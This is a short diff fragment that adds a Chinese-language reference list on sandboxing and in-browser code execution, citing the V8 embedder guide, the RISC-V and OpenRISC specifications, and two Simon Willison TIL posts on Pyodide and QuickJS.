+- **V8 Isolate 模型**，"Embedder's Guide"：[v8.dev/docs/embed](https://v8.dev/docs/embed)
+- **RISC-V ISA 规范**（TinyEMU/JSLinux 上下文）：[riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
+- **OpenRISC 1000 架构**：[opencores.org/or1k](https://opencores.org/or1k/)
+- **"Running Python code in a Pyodide sandbox via Deno"**，Simon Willison TIL，Wasm 对比：[til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
+- **"Running self-hosted QuickJS in a browser"**，Simon Willison TIL，quickjs-emscripten 包大小：[til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
+
+
+
